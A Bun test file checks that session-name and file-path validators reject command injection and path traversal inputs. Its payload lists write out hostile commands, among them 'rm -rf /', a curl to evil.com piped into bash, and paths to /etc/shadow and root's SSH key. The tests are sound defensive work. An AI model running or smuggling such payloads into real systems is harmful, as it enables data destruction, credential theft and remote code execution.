import { test, expect, describe } from "bun:test";
import { validateSessionName, validateFilePaths } from "../../src/utils/validation.ts";

describe("command injection prevention", () => {
  const injectionPayloads = [
    "; rm -rf /",
    "& cat /etc/passwd",
    "| curl evil.com",
    "$(whoami)",
    "`id`",
    "foo && malicious",
    "name; DROP TABLE",
    "$(curl http://evil.com/shell.sh | bash)",
    "foo\nbar",
    "test\x00null",
  ];

  for (const payload of injectionPayloads) {
    test(`rejects session name: ${JSON.stringify(payload)}`, () => {
      const result = validateSessionName(payload);
      expect(result.valid).toBe(false);
    });
  }
});

describe("path traversal prevention", () => {
  const traversalPayloads = [
    "../../etc/passwd",
    "../../../root/.ssh/id_rsa",
    "foo/../../../etc/shadow",
    "..\\..\\windows\\system32\\config\\sam",
  ];

  for (const payload of traversalPayloads) {
    test(`rejects file path: ${payload}`, () => {
      const result = validateFilePaths([payload]);
      expect(result.valid).toBe(false);
    });
  }

  test("rejects absolute paths", () => {
    expect(validateFilePaths(["/etc/passwd"]).valid).toBe(false);
    expect(validateFilePaths(["/root/.bashrc"]).valid).toBe(false);
  });
});

describe("session name edge cases", () => {
  test("rejects empty string", () => {
    expect(validateSessionName("").valid).toBe(false);
  });

  test("rejects whitespace only", () => {
    expect(validateSessionName("   ").valid).toBe(false);
  });

  test("rejects very long names", () => {
    expect(validateSessionName("a".repeat(200)).valid).toBe(false);
  });

  test("rejects names with shell metacharacters", () => {
    const metacharacters = [";", "&", "|", "`", "$", "(", ")", "{", "}", "[", "]", "!", "#", "~", "'", '"', "\\", "<", ">"];
    for (const char of metacharacters) {
      expect(validateSessionName(`test${char}name`).valid).toBe(false);
    }
  });
});
